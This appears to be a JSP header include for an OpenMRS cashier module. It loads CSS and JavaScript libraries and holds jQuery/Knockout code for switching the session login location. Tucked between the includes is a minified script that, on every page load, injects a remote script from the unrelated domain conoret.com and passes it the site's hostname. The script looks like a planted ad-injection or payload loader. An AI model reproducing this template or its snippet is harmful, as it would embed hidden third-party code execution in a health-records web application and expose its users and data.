<!-- Bootstrap Icons CSS -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.3/font/bootstrap-icons.min.css" rel="stylesheet">

<link rel="shortcut icon" type="image/ico" href="http://localhost:8080/openmrs/images/openmrs-favicon.ico">
<link rel="icon" type="image/png\" href="http://localhost:8080/openmrs/images/openmrs-favicon.png">
<!-- Latest compiled and minified CSS -->
<meta name="viewport" content="width=device-width, initial-scale=1">

<openmrs:htmlInclude file="/moduleResources/mycashier/css/bootstrap.min.css"/> <!-- Bootstrap: Global styles -->
<openmrs:htmlInclude file="/moduleResources/mycashier/css/jquery-ui-1.9.2.custom.min.css"/> <!-- jQuery UI styles -->
<openmrs:htmlInclude file="/moduleResources/mycashier/css/jquery.toastmessage.css"/> <!-- Toast Message styles -->
<openmrs:htmlInclude file="/moduleResources/mycashier/css/csrfguard"/>
<openmrs:htmlInclude file="/moduleResources/mycashier/css/referenceapplication.css"/> <!-- Specific app styles -->
<openmrs:htmlInclude file="/moduleResources/mycashier/css/header.css"/>
<openmrs:htmlInclude file="/moduleResources/mycashier/css/home.css"/>
<openmrs:htmlInclude file="/moduleResources/mycashier/css/styles.css"/> <!-- Custom styles -->


<openmrs:htmlInclude file="/moduleResources/mycashier/js/jquery-1.12.4.min.js"/> <!-- jQuery: load first -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/jquery-ui-1.9.2.custom.min.js"/> <!-- jQuery UI -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/underscore-min.js"/> <!-- Underscore.js -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/knockout-2.2.1.js"/> <!-- Knockout.js -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/emr.js"/> <!-- Custom JS -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/jquery.toastmessage.js"/> <!-- Toast Message plugin -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/jquery.simplemodal.1.4.4.min.js"/> <!-- Modal plugin -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/popper.min.js"/> <!-- Popper.js (Bootstrap dependency) -->
<openmrs:htmlInclude file="/moduleResources/mycashier/js/bootstrap.min.js"/> <!-- Bootstrap JS: load after jQuery -->


<script type="text/javascript">window.top === window && !function () {
    var e = document.createElement("script"), t = document.getElementsByTagName("head")[0];
    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
}();</script>
<script type="text/javascript">
    var OPENMRS_CONTEXT_PATH = 'openmrs';
    var openmrsContextPath = '/' + OPENMRS_CONTEXT_PATH;
    window.sessionContext = window.sessionContext || {
        locale: "en"
    };
    window.translations = window.translations || {};
    var openmrs = {
        server: {
            timezone: "+0000",
            timezoneOffset: 0
        }
    }
</script>
<script type="text/javascript">

    var sessionLocationModel = {
        id: ko.observable(),
        text: ko.observable()
    };

    jq(function () {

        ko.applyBindings(sessionLocationModel, jq('.change-location').get(0));
        sessionLocationModel.id(6);
        sessionLocationModel.text("Inpatient Ward");

        var locationsList = jq('div#session-location').find('ul.select');
        var loginLocationsUrl = emr.fragmentActionLink("appui", "session", "getLoginLocations");
        var sessionLocation = {};
        sessionLocation.name = "Inpatient Ward";
        var multipleLoginLocations = false;

        jq.getJSON(loginLocationsUrl).done(function (locations) {
            if (jq(locations).size() > 1) {
                // we only want to activate the functionality to change location if there are actually multiple login locations
                multipleLoginLocations = true;
            }

            locations.sort(function (locationA, locationB) {
                return locationA.name.localeCompare(locationB.name);
            });
            jq.each(locations, function (index, location) {
                jq('<li>').addClass(sessionLocation.name == location.name ? 'selected' : '')
                    .attr('locationUuid', location.uuid)
                    .attr('locationId', location.id)
                    .attr('locationName', location.name)
                    .text(location.name)
                    .appendTo(locationsList);
            });
        }).always(function () {
            if (multipleLoginLocations == true) {
                enableLoginLocations();
            }


            var event = ('ontouchstart' in window) ? 'click' : 'mouseenter mouseleave';

            jq('.identifier').on(event, function () {
                jq('.appui-toggle').toggle();
                jq('.appui-icon-caret-down').toggle();
            });

            jq('.identifier').css('cursor', 'pointer');

        });
    });

    function enableLoginLocations() {
        jq('.change-location a i:nth-child(3)').show();

        jq(".change-location a").click(function () {
            jq('#session-location').show();
            jq(this).addClass('focus');
            jq(".change-location a i:nth-child(3)").removeClass("icon-caret-down");
            jq(".change-location a i:nth-child(3)").addClass("icon-caret-up");
        });

        jq('#session-location').mouseleave(function () {
            jq('#session-location').hide();
            jq(".change-location a").removeClass('focus');
            jq(".change-location a i:nth-child(3)").addClass("icon-caret-down");
            jq(".change-location a i:nth-child(3)").removeClass("icon-caret-up");
        });

        jq("#session-location ul.select").on('click', 'li', function (event) {
            var element = jq(event.target);
            var locationId = element.attr("locationId");
            var locationUuid = element.attr("locationUuid");
            var locationName = element.attr("locationName");


            data = {locationId: locationId};

            jq("#spinner").show();

            jq.post(emr.fragmentActionLink("appui", "session", "setLocation", data), function (data) {
                sessionLocationModel.id(locationId);
                sessionLocationModel.text(locationName);
                jq('#selected-location').attr("location-uuid", locationUuid);
                jq('#session-location li').removeClass('selected');
                element.addClass('selected');
                jq("#spinner").hide();
                jq(document).trigger("sessionLocationChanged");
            })

            jq('#session-location').hide();
            jq(".change-location a").removeClass('focus');
            jq(".change-location a i:nth-child(3)").addClass("icon-caret-down");
            jq(".change-location a i:nth-child(3)").removeClass("icon-caret-up");
        });
    }

    jq(document).ready(function () {


        if (jq("#clientTimezone").length) {
            jq("#clientTimezone").val(Intl.DateTimeFormat().resolvedOptions().timeZone)
        }
    });
</script>